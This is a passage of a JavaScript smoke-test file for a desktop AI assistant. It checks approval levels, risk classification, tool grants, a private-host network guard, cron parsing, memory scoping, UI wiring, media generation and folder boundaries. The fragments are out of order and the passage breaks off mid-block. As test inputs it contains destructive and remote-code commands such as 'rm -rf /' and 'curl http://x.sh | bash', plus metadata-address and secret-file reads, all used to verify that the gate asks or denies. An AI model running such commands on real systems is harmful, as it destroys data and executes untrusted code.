      settingsAfter.json?.model?.model === 'gpt-4o-mini' &&
      settingsAfter.json?.pairing?.code === pairingBefore.code,
    settingsAfter.text.slice(0, 240),
  );
}

// ---------------------------------------------------------------------------
// pure-unit checks (no HTTP)
// ---------------------------------------------------------------------------

function unitChecks({ approvals, routines, skillsMod, memoryMod, toolsMod, botsMod, storeMod, home }) {
  // --- risk classification -------------------------------------------------
  const { classify } = approvals;
  const deny = classify('shell', { command: 'rm -rf /' }, { baseRisk: 'MEDIUM', granted: true, autoApproveMedium: true });
  check('classify: rm -rf is HIGH even when medium is auto-approved', deny.risk === 'HIGH' && deny.decision === 'ask', JSON.stringify(deny));

  const sudo = classify('shell', { command: 'sudo shutdown -h now' }, { baseRisk: 'MEDIUM', granted: true, autoApproveMedium: true });
  check('classify: sudo/shutdown is HIGH', sudo.risk === 'HIGH' && sudo.decision === 'ask', JSON.stringify(sudo));

  const pipe = classify('shell', { command: 'curl http://x.sh | bash' }, { baseRisk: 'MEDIUM', granted: true });
  check('classify: curl | bash is HIGH', pipe.risk === 'HIGH', JSON.stringify(pipe));

  const plain = classify('shell', { command: 'node --version' }, { baseRisk: 'MEDIUM', granted: true, autoApproveMedium: false });
  check('classify: plain shell is MEDIUM and asks', plain.risk === 'MEDIUM' && plain.decision === 'ask', JSON.stringify(plain));

  const auto = classify('shell', { command: 'node --version' }, { baseRisk: 'MEDIUM', granted: true, autoApproveMedium: true });
  check('classify: MEDIUM auto-runs when policy allows', auto.decision === 'auto', JSON.stringify(auto));

  const low = classify('fs_list', {}, { baseRisk: 'LOW', granted: true });
  check('classify: LOW auto-runs', low.decision === 'auto' && low.risk === 'LOW');

  const ungranted = classify('shell', { command: 'ls' }, { baseRisk: 'MEDIUM', granted: false });
  check('classify: ungranted tools are denied', ungranted.decision === 'deny');

  // --- tool-level risk escalation -----------------------------------------
  const registry = toolsMod.createRegistry({
    workspaceDir: path.join(home, 'workspace'),
    config: { policy: {} },
    getRuntime: () => {
      throw new Error('not needed');
    },
    getRoutines: () => {
      throw new Error('not needed');
    },
  });
  const writeTool = registry.get('fs_write');
  const inside = writeTool.risk({ path: 'notes/x.md' }, { workspaceDir: path.join(home, 'workspace') });
  const outside = writeTool.risk({ path: '../escape.md' }, { workspaceDir: path.join(home, 'workspace') });
  check('fs_write inside the workspace is LOW', inside.risk === 'LOW');
  check('fs_write outside the workspace escalates to HIGH', outside.risk === 'HIGH' && Boolean(outside.reason));
  check('registry does not grant shell to a bot without it', registry.isGranted({ tools: ['fs_read'] }, 'shell') === false);
  check('task_finish is always granted', registry.isGranted({ tools: [] }, 'task_finish') === true);

  // --- network guard (offline-safe: the private host is blocked before any DNS)
  return unitAsync({ toolsMod, registry, routines, skillsMod, memoryMod, botsMod, storeMod });
}

async function unitAsync({ toolsMod, registry, routines, skillsMod, memoryMod, botsMod, storeMod }) {
  const httpTool = registry.get('http_fetch');
  let blocked = null;
  try {
    await httpTool.run({ url: 'http://127.0.0.1:9/secret' }, { workspaceDir: path.join(home, 'workspace') });
  } catch (err) {
    blocked = err;
  }
  check('http_fetch blocks loopback/private hosts', blocked?.code === 'PRIVATE_HOST_BLOCKED', blocked?.code || 'no error');

  check('isPrivateHost flags 10/8 and 169.254', toolsMod.isPrivateHost('10.1.2.3') && toolsMod.isPrivateHost('169.254.169.254'));
  check('isPrivateHost allows a public host', toolsMod.isPrivateHost('example.com') === false);

  // browser_open without CHROME_PATH must answer, not throw.
  const browserTool = registry.get('browser_open');
  const browserResult = await browserTool.run({ url: 'https://example.com' }, { workspaceDir: path.join(home, 'workspace') });
  check(
    'browser_open returns a structured not_configured error',
    browserResult.ok === false && browserResult.error?.code === 'not_configured',
    JSON.stringify(browserResult).slice(0, 120),
  );

  // --- cron ---------------------------------------------------------------
  const every5 = routines.parseCron('*/5 * * * *');
  const from = Date.now();
  const next5 = routines.nextRunFor(every5, from, 'UTC');
  check('cron */5 * * * * fires within 5 minutes', next5 > from && next5 - from <= 5 * 60 * 1000 + 1000, `${Math.round((next5 - from) / 1000)}s`);

  const weekdays = routines.parseCron('0 9 * * 1-5');
  const nextWeekday = routines.nextRunFor(weekdays, from, 'Asia/Shanghai');
  const shanghai = routines.tzParts(nextWeekday, 'Asia/Shanghai');
  check('cron 0 9 * * 1-5 lands at 09:00 Shanghai', shanghai.hour === 9 && shanghai.minute === 0, JSON.stringify(shanghai));
  check('cron weekday schedule skips the weekend', [1, 2, 3, 4, 5].includes(shanghaiWeekday(nextWeekday)), `weekday ${shanghaiWeekday(nextWeekday)}`);

  const interval = routines.parseSchedule('every 30 minutes');
  check('interval schedule parses', interval.kind === 'interval' && interval.intervalMs === 30 * 60000);
  check('interval nextRun is exactly one interval later', routines.nextRunFor(interval, from, 'UTC') === from + 30 * 60000);

  let cronError = null;
  try {
    routines.parseCron('not a cron');
  } catch (err) {
    cronError = err;
  }
  check('invalid cron throws CRON_INVALID', cronError?.code === 'CRON_INVALID', cronError?.message);

  let cronRangeError = null;
  try {
    routines.parseCron('99 0 * * *');
  } catch (err) {
    cronRangeError = err;
  }
  check('out-of-range cron field is rejected', cronRangeError?.code === 'CRON_INVALID');

  // --- skills frontmatter -------------------------------------------------
  const skill = await skillsMod.readSkill('release-check');
  check('frontmatter parser reads name/steps/validation', skill?.name === 'release-check' && skill.steps.length >= 4 && Boolean(skill.validation));
  check('frontmatter parser keeps approval_notes', String(skill?.approval_notes || '').includes('HIGH'));
  const digest = await skillsMod.renderSkillsDigest(['release-check']);
  check('skills digest only includes granted skills', digest.includes('release-check') && !digest.includes('workspace-sweep'), digest.slice(0, 120));

  // --- memory retrieval ---------------------------------------------------
  await memoryMod.appendMemory('researcher', 'The user prefers citations with dates and no bullet points longer than two lines.');
  await memoryMod.appendMemory('researcher', 'The staging server lives on a private network and needs a VPN.');
  await memoryMod.appendMemory('shared', 'The user goes by Sam and works in the Asia/Shanghai timezone.');
  const hits = await memoryMod.retrieve({ botId: 'researcher', query: 'citation style preferences', limit: 3 });
  check('memory retrieval ranks by keyword overlap', hits.length > 0 && hits[0].text.includes('citations'), JSON.stringify(hits.map((h) => h.text.slice(0, 40))));
  const sharedHit = await memoryMod.retrieve({ botId: 'researcher', query: 'timezone', limit: 3 });
  check('shared facts are visible to a bot', sharedHit.some((h) => h.source === 'shared' && h.text.includes('Asia/Shanghai')));
  const scoped = await memoryMod.retrieve({ botId: 'chief', query: 'VPN staging', includeShared: false, limit: 3 });
  check('memory is scoped per bot', scoped.every((h) => h.source === 'chief'), JSON.stringify(scoped.map((h) => h.source)));

  // --- sidebar previews (pure, against hand-written session logs) ----------
  const sessionsDir = path.join(home, 'data', 'sessions');
  await fsp.mkdir(sessionsDir, { recursive: true });
  const writeSession = (botId, records) =>
    fsp.writeFile(path.join(sessionsDir, `${botId}.jsonl`), `${records.map((r) => JSON.stringify(r)).join('\n')}\n`);

  const ts = '2026-01-02T03:04:05.000Z';
  const longUser = `please summarise ${'x'.repeat(200)}`;
  const longAssistant = `First line of the answer.\n\nSecond paragraph ${'y'.repeat(140)}`;
  await writeSession('previewprobe', [
    { ts, kind: 'user', text: longUser },
    { ts, kind: 'assistant', text: longAssistant },
    { ts, kind: 'tool', name: 'fs_read', args: {}, ok: true, output: { data: 'noise' } },
    { ts, kind: 'approval', toolName: 'fs_write', risk: 'HIGH' },
    { ts, kind: 'turn', status: 'success', summary: 'done' },
  ]);

  const preview = await botsMod.lastMessagePreview('previewprobe');
  const expectedPreview = Array.from(longAssistant.replace(/\s+/g, ' ').trim())
    .slice(0, 120)
    .join('');
  checkEqual('preview: the last meaningful message is the assistant reply', preview?.text, expectedPreview);
  check('preview: whitespace is flattened to one line', preview?.text?.includes('First line of the answer. Second paragraph'));
  check('preview: exactly 120 characters, truncated without an ellipsis', Array.from(preview?.text || '').length === 120);
  checkEqual('preview: kind is the record kind', preview?.kind, 'assistant');
  checkEqual('preview: ts is the record timestamp', preview?.ts, ts);
  check('preview: tool/approval/turn rows are skipped', !String(preview?.text).includes('fs_read'));

  check('preview: a bot with no transcript has no preview', (await botsMod.lastMessagePreview('never-spoke')) === null);

  await writeSession('noiseonly', [
    { ts, kind: 'tool', name: 'shell', output: 'x' },
    { ts, kind: 'approval', toolName: 'shell', risk: 'MEDIUM' },
    { ts, kind: 'turn', status: 'failed' },
  ]);
  check('preview: a transcript of only tool/status rows yields null', (await botsMod.lastMessagePreview('noiseonly')) === null);

  await fsp.writeFile(
    path.join(sessionsDir, 'torn.jsonl'),
    `${JSON.stringify({ ts, kind: 'user', text: 'intact despite the torn line' })}\n{"kind":"assis`,
  );
  checkEqual('preview: a torn last line does not hide the message before it', (await botsMod.lastMessagePreview('torn'))?.text, 'intact despite the torn line');

  // ~520 KB of tool noise *after* the last real message: the tail reader has to
  // widen its window instead of reading the whole log or giving up.
  const wall = [];
  for (let i = 0; i < 4000; i += 1) wall.push({ ts, kind: 'tool', name: 'fs_read', output: `noise ${i} ${'z'.repeat(80)}` });
  await writeSession('noisy', [{ ts, kind: 'user', text: 'buried but real' }, ...wall]);
  const wallSize = (await fsp.stat(path.join(sessionsDir, 'noisy.jsonl'))).size;
  check('preview: the noise wall really is bigger than the first tail window', wallSize > 512 * 1024, `${Math.round(wallSize / 1024)} KB`);
  checkEqual('preview: the reader widens past a wall of tool output', (await botsMod.lastMessagePreview('noisy'))?.text, 'buried but real');

  const tail = await storeMod.readJsonlTail(path.join(sessionsDir, 'noisy.jsonl'), { windowBytes: 4096, maxBytes: 4096 });
  check(
    'readJsonlTail reads a bounded tail of whole records',
    tail.length > 0 && tail.every((record) => record.kind === 'tool') && tail.length < 100,
    `${tail.length} records`,
  );
  check('readJsonlTail returns [] for a missing file', (await storeMod.readJsonlTail(path.join(sessionsDir, 'nope.jsonl'))).length === 0);
}

function shanghaiWeekday(ts) {
  // Monday=1 .. Sunday=7, matching ISO weekdays.
  const parts = new Intl.DateTimeFormat('en-US', { timeZone: 'Asia/Shanghai', weekday: 'short' }).format(new Date(ts));
  return { Mon: 1, Tue: 2, Wed: 3, Thu: 4, Fri: 5, Sat: 6, Sun: 7 }[parts];
}


  // A removed element must not break boot: every `$('id').addEventListener`
  // without optional chaining has to point at markup that still exists.
  {
    const html = await readText('../public/index.html');
    const ids = [...html.matchAll(/\$\('([A-Za-z0-9_-]+)'\)\.addEventListener/g)].map((m) => m[1]);
    const missing = [...new Set(ids)].filter((id) => !html.includes(`id="${id}"`));
    check('no unguarded listener wiring for removed elements', missing.length === 0, `missing: ${missing.join(', ')}`);
  }


  // The product ships ONE bot that can do everything; specialists are created
  // on demand. Old installs keep their bots, but an untouched "总管" is renamed.
  {
    const seeded = (await fsp.readdir(new URL('../config/bots/', import.meta.url))).filter((n) => n.endsWith('.json'));
    check('config ships exactly one bot', seeded.length === 1 && seeded[0] === 'chief.json', seeded.join(','));
    const seed = JSON.parse(await readText('../config/bots/chief.json'));
    const needed = ['shell', 'fs_write', 'fs_delete', 'browser_open', 'http_fetch', 'bot_create', 'group_create', 'routine_create', 'settings_update', 'ui_set'];
    check('the one bot is granted every capability', needed.every((n) => seed.tools.includes(n)), needed.filter((n) => !seed.tools.includes(n)).join(','));
    check('the one bot is called 助理', seed.name === '助理' && seed.primary === true);
  }

  // Design v2 (Notion §97.5): one brand colour, surfaces, a settings list on phones.
  {
    const html = await readText('../public/index.html');
    check('design v2 layer is present with light and dark tokens', html.includes('v7 · design v2') && html.includes('--on-accent: #0A0A0A;') && html.includes('--on-accent: #FFFFFF;'));
    check('buttons on the accent use the on-accent colour, not white', html.includes('.usage-range button.on, .pc-mobile-bar button.on { color: var(--on-accent); }'));
    check('phone settings open on a list and have a way back', html.includes('id="settings-back"') && html.includes("$('settings-back')?.addEventListener('click', showSettingsHome)") && html.includes('if (isMobile() && !section) showSettingsHome();'));
    check('every settings page has a line icon', (html.match(/<button class="setnav[^>]*data-set-target="([a-z-]+)"/g) || []).every((b) => html.includes("'" + b.match(/data-set-target="([a-z-]+)"/)[1] + "':")));
    check('both sides keep a bubble, the human one a softer grey', html.includes('--bubble-user: #333333;') && html.includes('--bubble-user: #E3E3E3;') && html.includes('background: var(--bubble-bot); border: 0; box-shadow: none; padding: 10px 16px;'));
    check('settings icons are sized and only shown in the phone list', html.includes('<svg class="setnav-icon" width="20" height="20"') && html.includes('  .setnav-icon { display: none; }') && html.includes('.settings-modal.set-home .setnav svg { display: block;'));
    check('the sidebar is set apart from the chat (darker grey in light, a divider line)', html.includes('--bg: #FFFFFF; --bg-2: #F0F0F0;') && html.includes('.sidebar, html[data-theme="light"] .sidebar { border-right: 1px solid var(--border); }'));
    check('feishu apps of their own: the settings list, the add form and its button are wired', ['feishu-apps', 'feishu-app-bot', 'feishu-app-id', 'feishu-app-secret', 'feishu-app-save'].every((id) => html.includes(`id="${id}"`)) && html.includes("$('feishu-app-save')?.addEventListener('click', addFeishuApp)"));
    const launcher = await readText('../mobile/shell/launcher.js');
    check('the app picker says how each machine is reached', launcher.includes('function linkKind(raw)') && launcher.includes('url.textContent = linkKind(entry.best || entry.url);'));
    const shellHtml = await readText('../mobile/shell/index.html');
    {
      const srvSrc = await readText('../src/server.mjs');
      const page = await readText('../public/index.html');
      check('switching machines hands over every address and the phone opens the first it can reach (a VM Tailscale address when its LAN one is internal to the computer)', srvSrc.includes('return { ok: true, machine: peer.name, url: made.url, links, qr: made.qr || null, expiresAt: made.expiresAt };') && page.includes('for (const url of candidates) {') && page.includes('const next = new URL(target);'));
      check('a long toast stays a rounded box, not an oval', /.toast {[^}]*border-radius: 16px;/.test(page));
    }
    check('opening a machine keeps the phone on the address it already uses (LAN, Tailscale) and takes the public one last', launcher.includes('return { lan: 1, tailnet: 2, public: 3 }[l.kind] ?? 2;') && launcher.includes('await pickReachableLink(links, safeOrigin(hub))') && !launcher.includes('await pickReachableLink(links)'));
    check('the phone opens on its machine list whenever machines are saved, even when the last-opened one was deleted', launcher.includes('if (!state.hub && saved.length) {') && launcher.includes('if (hubs.length) await store.set(KEYS.hub, hubs[0].url);'));
    check('「全部忘记」 asks, then really forgets every saved machine and its login', launcher.includes('async function forgetAllHubs()') && launcher.includes('await forgetAllHubs();') && launcher.includes('忘记这台手机上保存的全部'));
    check('the connect page leads back to the list and gives the current pairing steps, not the old npm start hint', shellHtml.includes('id="connect-back"') && launcher.includes("dom.connectBack?.addEventListener('click', () => showConnected());") && !shellHtml.includes('ASSIST_ALLOW_REMOTE=1 HOST=0.0.0.0 npm start') && shellHtml.includes('只要配对一台'));
  }

  // One machine concept: the old "看谁的屏幕" take-over list must not come back.
  {
    const html = await readText('../public/index.html');
    check('no separate take-over target list in the UI', !/desk.vncTargets|id="pc-target"/.test(html));
    const preload = await readText('../desktop/shell-preload.cjs');
    check(
      'the desktop bridge can add, rename and remove machines',
      ['addMachine', 'renameMachine', 'removeMachine', 'switchHub', 'listMachines'].every((k) => preload.includes(k)),
    );
  }

  // The machine controls must actually be wired; "no reaction" is a bug.
  {
    const html = await readText('../public/index.html');
    for (const id of ['set-add-machine', 'set-machines-list', 'machine-btn', 'machine-menu']) {
      check(`machine control ${id} is wired`, html.includes(`$('${id}')?.addEventListener`) || html.includes(`$('${id}').addEventListener`));
    }
    // Takeover / login cards are things to click, not "process": hiding tool
    // chips (the default) must not hide them, live or after a reload.
    const filters = html.match(/state\.showProcess \|\| m\.(role|kind) !== 'tool'[^)]*\)/g) || [];
    check('action cards: both transcripts keep takeover/login cards when tool chips are hidden', filters.length === 2 && filters.every((f) => f.includes('isActionCard(')));
    const live = html.slice(html.indexOf('function appendLiveChip'), html.indexOf('function appendLiveChip') + 900);
    check('action cards: the live stream shows them when tool chips are hidden', /isActionCard\(chip\.name\)/.test(live) && /!state\.showProcess && !card/.test(live));
    // Step 4: offline banner, takeover popup, notifications.
    for (const id of ['pc-done', 'conn-retry', 'conn-local']) {
      check(`takeover/offline control ${id} is wired`, html.includes(`id="${id}"`) && html.includes(`$('${id}')?.addEventListener`));
    }
    check('offline: only silence counts (an HTTP error means the machine answered)', /if \(!err\.status\) setConnected\(false\)/.test(html) && /setConnected\(true\)/.test(html));
    check('takeover: a request in the open chat pops the full-window takeover, elsewhere it notifies', /if \(takeover\) popupTakeover\(\)/.test(html) && /notifyHuman\(\{/.test(html) && /onActionRequest\(ev\)/.test(html));
    const main = await readText('../desktop/main.mjs');
    const preload = await readText('../desktop/shell-preload.cjs');
    check('notifications: the shell shows them and a click comes back to the page', /ipcMain\.handle\('desk:notify'/.test(main) && /deskNotificationClick/.test(main) && /setAppUserModelId\('com\.desk\.assistant'\)/.test(main) && /flashFrame\(true\)/.test(main) && /notify: \(note\) => ipcRenderer\.invoke\('desk:notify'/.test(preload));
  }

main().catch(async (err) => {
  console.error('');
  console.error('SMOKE CRASHED:', err?.stack || err);
  await stopChild().catch(() => {});
  process.exitCode = 1;
});

async function scenarioMachinesAndPolicy({ approvals, toolsMod }) {
  // Approval levels and the human's own blocked words.
  {
    const ap = await import('../src/approvals.mjs');
    const lvl = (policy) => ap.effectivePolicy(policy);
    check('levels: old configs map onto standard / auto', lvl({}).level === 'standard' && lvl({ autoApproveAll: true }).level === 'auto' && lvl({ level: 'careful', autoApproveAll: true }).level === 'careful');
    const decide = (level, risk, trusted = false, cmd = 'ls', extra = []) => {
      const m = ap.effectivePolicy({ level, extraDeny: extra });
      return ap.classify('shell', { command: cmd }, {
        baseRisk: risk,
        autoApproveMedium: m.careful ? false : (trusted || m.autonomous),
        autoApproveAll: m.autonomous,
        denyPatterns: m.denyPatterns,
      }).decision;
    };
    check('levels: careful asks even for a trusted bot', decide('careful', 'MEDIUM', true) === 'ask' && decide('careful', 'HIGH') === 'ask');
    check('levels: standard lets a trusted bot do routine work, asks for high risk', decide('standard', 'MEDIUM', true) === 'auto' && decide('standard', 'MEDIUM', false) === 'ask' && decide('standard', 'HIGH') === 'ask');
    check('levels: hands-off runs high risk but the danger list still asks', decide('auto', 'HIGH') === 'auto' && decide('auto', 'MEDIUM', false, 'rm -rf /') === 'ask');
    const extra = [{ id: 'd1', text: 'git push', pattern: ap.phraseToPattern('git push') }];
    check('blocked words: a word you added stops a command even in hands-off', decide('auto', 'MEDIUM', false, 'git push origin main', extra) === 'ask' && decide('auto', 'MEDIUM', false, 'git pull', extra) === 'auto');
  }
  // Image / video generation against a stand-in provider (no network, no cost).
  {
    const os = await import('node:os');
    const fsx = await import('node:fs');
    const MD = await import('../src/media.mjs');
    const ws = fsx.mkdtempSync(path.join(os.tmpdir(), 'media-'));
    const PNG = Buffer.from('89504e470d0a1a0a', 'hex');
    const calls = [];
    let polls = 0;
    const fakeFetch = async (url, init = {}) => {
      calls.push([init.method || 'GET', url, init.body ? JSON.parse(init.body) : null]);
      const json = (o) => ({ ok: true, status: 200, headers: new Map(), text: async () => JSON.stringify(o) });
      if (url.endsWith('/images/generations')) {
        return calls.at(-1)[2].image_size ? json({ images: [{ url: 'https://cdn.test/a.png' }] }) : json({ data: [{ b64_json: PNG.toString('base64') }] });
      }
      if (url.endsWith('/video/submit')) return json({ requestId: 'r1' });
      if (url.endsWith('/video/status')) { polls += 1; return json(polls < 2 ? { status: 'InProgress' } : { status: 'Succeed', results: { videos: [{ url: 'https://cdn.test/v.mp4' }] } }); }
      if (url.endsWith('/contents/generations/tasks')) return json({ id: 't1' });
      if (url.includes('/contents/generations/tasks/t1')) return json({ status: 'succeeded', content: { video_url: 'https://cdn.test/w.mp4' } });
      if (url.startsWith('https://cdn.test/')) return { ok: true, status: 200, headers: new Map([['content-type', url.endsWith('.png') ? 'image/png' : 'video/mp4']]), arrayBuffer: async () => PNG };
      return { ok: false, status: 404, headers: new Map(), text: async () => 'nope' };
    };
    const sf = MD.resolveMedia({ image: { service: '', apiKey: '' }, video: { service: '', apiKey: '' } }, 'image', { voice: { baseUrl: 'https://api.siliconflow.cn/v1', apiKey: 'sk-voice' } });
    check('generation: a SiliconFlow voice key works for pictures too', sf?.source === 'voice' && sf.kind === 'siliconflow' && sf.model === 'Kwai-Kolors/Kolors');
    const img = await MD.generateImages(sf, { prompt: '一只橘猫', size: '720x1280' }, { workspaceDir: ws, fetchImpl: fakeFetch });
    const sent = calls.find((c) => c[1].endsWith('/images/generations'))[2];
    check('generation: SiliconFlow image request and the picture lands in the workspace', sent.image_size === '720x1280' && sent.model === 'Kwai-Kolors/Kolors' && img.paths.length === 1 && /^generated\/\d{4}-\d{2}-\d{2}\/image-.+\.png$/.test(img.paths[0]) && fsx.existsSync(path.join(ws, img.paths[0])));
    const oa = MD.resolveMedia({ image: { service: 'openai', apiKey: 'sk-own', baseUrl: '', model: '' } }, 'image', {});
    const img2 = await MD.generateImages(oa, { prompt: 'a cat', count: 2 }, { workspaceDir: ws, fetchImpl: fakeFetch });
    check('generation: OpenAI-shaped (base64) images, one call each', oa.source === 'own' && img2.paths.length === 2);
    const progress = [];
    const vid = await MD.generateVideo(MD.resolveMedia({}, 'video', { voice: { apiKey: 'sk-voice' } }), { prompt: '海浪' }, { workspaceDir: ws, fetchImpl: fakeFetch, pollMs: 5, onProgress: (s) => progress.push(s) });
    check('generation: SiliconFlow video is submitted, polled until done, saved as mp4', polls === 2 && /^generated\/.+\/video-.+\.mp4$/.test(vid.path) && fsx.existsSync(path.join(ws, vid.path)));
    check('generation: a video reports its progress while it waits', progress.includes('inprogress') && progress.at(-1) === 'done');
    const ark = await MD.generateVideo(MD.resolveMedia({ video: { service: 'ark', apiKey: 'ark-key' } }, 'video', {}), { prompt: '海浪', imageDataUrl: 'data:image/png;base64,AA' }, { workspaceDir: ws, fetchImpl: fakeFetch, pollMs: 5 });
    const arkBody = calls.find((c) => c[1].endsWith('/contents/generations/tasks'))[2];
    check('generation: Ark Seedance task with a first frame', /\.mp4$/.test(ark.path) && arkBody.content.some((c) => c.type === 'image_url'));
    // Background video jobs: survive a restart, report back when done or failed.
    {
      const { createVideoJobs } = await import('../src/videojobs.mjs');
      const jobFile = path.join(ws, 'video-jobs.json');
      const done = [];
      const failed = [];
      polls = 0;
      const mk = () => createVideoJobs({ file: jobFile, getKey: () => 'sk-voice', workspaceDir: ws, fetchImpl: fakeFetch, pollMs: 60000, onDone: (j) => done.push(j), onFail: (j) => failed.push(j) });
      const first = mk();
      await first.load();
      const task = await MD.submitVideo(MD.resolveMedia({}, 'video', { voice: { apiKey: 'sk-voice' } }), { prompt: '海浪' }, { fetchImpl: fakeFetch });
      await first.add({ botId: 'chief', prompt: '海浪', task });
      const again = mk(); // a restart before it finished
      await again.load();
      await again.tick(); // InProgress
      await again.tick(); // Succeed
      check('video jobs: kept across a restart, then downloaded and reported to the bot that asked', done.length === 1 && done[0].botId === 'chief' && /\.mp4$/.test(done[0].path) && fsx.existsSync(path.join(ws, done[0].path)) && !JSON.stringify(fsx.readFileSync(jobFile, 'utf8')).includes('sk-voice'));
      const badFetch = async (url, init) => (url.endsWith('/video/status') ? { ok: true, status: 200, headers: new Map(), text: async () => JSON.stringify({ status: 'Failed', reason: '内容不合规' }) } : fakeFetch(url, init));
      const third = createVideoJobs({ file: path.join(ws, 'vj2.json'), getKey: () => 'k', workspaceDir: ws, fetchImpl: badFetch, pollMs: 60000, onFail: (j) => failed.push(j) });
      await third.load();
      await third.add({ botId: 'chief', prompt: 'x', task });
      await third.tick();
      check('video jobs: a failed video is reported with the reason', failed.length === 1 && /内容不合规/.test(failed[0].error));
      const g = await third.add({ botId: 'chief', groupId: 'g1', prompt: 'y', task });
      check('video jobs: one asked for in a group remembers the group', g.groupId === 'g1' && third.list().some((j) => j.groupId === 'g1'));
    }
    // Small fixes carried into this step.
    {
      const { buildLaunchArgs } = await import('../src/browser.mjs');
      const args = buildLaunchArgs({ port: 1, profileDir: 'x' });
      check('bot browser: no Edge auto sign-in, no sync', args.includes('--disable-sync') && args.some((a) => /msImplicitSignin/.test(a)));
      const agentSrc = await readText('../src/agent.mjs');
      check('task end: a summary is not repeated when the model already answered in that step', /if \(!ctx\?\.spokeThisStep\) await this\.streamText/.test(agentSrc));
      check('takeover: a copied "点「接管屏幕」" reply still gets the takeover card', /auto_takeover_/.test(agentSrc) && /waitingFor = 'takeover';/.test(agentSrc));
    }
    // Step 8: what the bots may touch (opened folders, sudo).
    {
      const os = await import('node:os');
      const fsx = await import('node:fs');
      const B = await import('../src/boundary.mjs');
      const ws = fsx.mkdtempSync(path.join(os.tmpdir(), 'ws-'));
      const docs = fsx.mkdtempSync(path.join(os.tmpdir(), 'docs-'));
      const secret = path.join(os.homedir(), 'secret-notes.txt');
      const pol = (p = {}) => ({ workspaceDir: ws, policy: p });
      check('boundary: the workspace is always fine', B.checkBoundary('fs_write', { path: 'notes/a.md' }, pol()) === null && B.checkBoundary('fs_read', { path: path.join(ws, 'x.txt') }, pol()) === null);
      const out = B.checkBoundary('fs_read', { path: secret }, pol({ level: 'auto' }));
      check('boundary: a file outside the opened folders asks, whatever the level', out?.decision === 'ask' && out.code === 'FOLDER_NOT_OPEN');
      check('boundary: "一律不许" refuses instead', B.checkBoundary('fs_read', { path: secret }, pol({ outside: 'deny' }))?.decision === 'deny');
      const opened = pol({ folders: [{ id: 'd1', path: docs, write: false }] });
      check('boundary: an opened folder can be read; a read-only one cannot be written', B.checkBoundary('fs_read', { path: path.join(docs, 'r.txt') }, opened) === null && B.checkBoundary('fs_write', { path: path.join(docs, 'w.txt') }, opened)?.code === 'FOLDER_READ_ONLY');
      check('boundary: a command naming a place outside asks; climbing out with .. too; plain commands do not', B.checkBoundary('shell', { command: `cat "${secret}"` }, pol())?.decision === 'ask' && B.checkBoundary('shell', { command: 'cat ../../x.txt' }, pol())?.decision === 'ask' && B.checkBoundary('shell', { command: 'node -v && git status' }, pol()) === null);
      check('boundary: sudo / admin asks first unless allowed', B.checkBoundary('shell', { command: 'sudo apt-get install -y htop' }, pol())?.code === 'SUDO_ASKS' && B.checkBoundary('shell', { command: 'Start-Process powershell -Verb RunAs' }, pol())?.code === 'SUDO_ASKS' && B.checkBoundary('shell', { command: 'sudo ls' }, pol({ sudo: 'allow' })) === null);
      const agentSrc = await readText('../src/agent.mjs');
      check('boundary: applied after the rules, so "直接做" cannot open a folder', agentSrc.indexOf('checkBoundary(name') > agentSrc.indexOf('applyRules(verdict'));
      const add = await api('/api/policy', { method: 'PUT', body: { addFolder: { path: docs, write: true } } });
      const bad = await api('/api/policy', { method: 'PUT', body: { addFolder: { path: 'relative/dir' } } });
      const root = await api('/api/policy', { method: 'PUT', body: { addFolder: { path: path.parse(docs).root } } });
      const f = add.json?.folders?.find((x) => x.path === path.resolve(docs));
      check('policy: a folder is opened by full path; relative paths and disk roots are refused', add.status === 200 && f?.write === true && bad.status === 400 && root.status === 400);
      const sudo = await api('/api/policy', { method: 'PUT', body: { sudo: 'allow', outside: 'deny' } });
      check('policy: sudo and "everywhere else" are settings of their own', sudo.json?.sudo === 'allow' && sudo.json?.outside === 'deny');
      await api('/api/policy', { method: 'PUT', body: { removeFolder: f?.id, sudo: 'ask', outside: 'ask' } });
      {
        // 「主助理完全信任」: the primary bot is not fenced (sudo, other places); the level and the denylist still apply.
        const on = await api('/api/policy', { method: 'PUT', body: { trustPrimary: true } });
        const agentSrc = await readText('../src/agent.mjs');
        const page = await readText('../public/index.html');
        check('trust: the main assistant can be trusted past sudo and other places, only that bot, and the switch is in Settings', on.json?.trustPrimary === true && agentSrc.includes("Boolean(bot.primary || (this.config.primaryBotId && bot.id === this.config.primaryBotId))") && agentSrc.includes('if (verdict.decision !== DECISION.DENY && !trusted) {') && page.includes('id="trust-primary"'));
        const off = await api('/api/policy', { method: 'PUT', body: { trustPrimary: false } });
        check('trust: off again by default and in one-click strict', off.json?.trustPrimary === false && page.includes("takeover: 'view', trustPrimary: false }"));
      }
    }
    // Small fixes carried into step 8 (Feishu).
    {
      const FS = await import('../src/feishu.mjs');
      const f = FS.createFeishu({ file: 'x', bus: null });
      const t = f._stripPaths('画好了 🐱\ngenerated/2026-11-08/image-a.png\n橘白小猫蜷在窗台上。', ['generated/2026-11-08/image-a.png']);
      check('feishu: the picture is sent, its local path is left out of the text', t === '画好了 🐱\n\n橘白小猫蜷在窗台上。');
      const feishuSrc = await readText('../src/feishu.mjs');
      check('feishu: saving the same settings again does not drop the connection', /const changed = `\$\{cfg\.appId\}\|\$\{cfg\.appSecret\}\|\$\{cfg\.enabled\}` !== before;/.test(feishuSrc));
    }
    // Step 9: faster installs (Hub first, desktop + browser in the background; Node from the client).
    {
      const sh = await readText('../hub/setup-linux.sh');
      const hubStart = sh.indexOf('say "6/7');
      const bg = sh.indexOf('systemd-run --unit=desk-desktop-setup');
      check('install: desktop and browser install after the Hub is up, in their own unit', hubStart > 0 && bg > hubStart && /DESKTOP_OK=pending/.test(sh) && !/^\s*pm_install xfce4 xfce4-terminal\s*$/m.test(sh.slice(0, hubStart)));
      check('install: a Node package brought by the client is used instead of downloading', /--node\)\s+NODE_TAR=/.test(sh) && /用夜班带过来的 Node/.test(sh));
      const ps1 = await readText('../hub/setup-windows.ps1');
      check('install (Windows): the same for the Node zip', /\[string\]\$NodeZip/.test(ps1) && /用夜班带过来的 Node/.test(ps1));
      const fsx = await import('node:fs');
      const setupFile = path.join(home, 'data', 'desktop-setup.json');
      fsx.writeFileSync(setupFile, JSON.stringify({ state: 'running', startedAt: new Date().toISOString(), detail: '安装 XFCE 桌面' }));
      const pc = await api('/api/computer');
      fsx.rmSync(setupFile, { force: true });
      check('install: the screen panel hears that the desktop is still installing', pc.json?.desktopSetup?.state === 'running' && /XFCE/.test(pc.json.desktopSetup.detail));
      const br = await readText('../src/browser.mjs');
      check('install: a bot that needs the browser meanwhile is told it is still installing', /browser_installing/.test(br));
      // Step 10 small fixes: the panel says "installing" instead of a black live view; a faster mirror for this install only.
      const ui = await readText('../public/index.html');
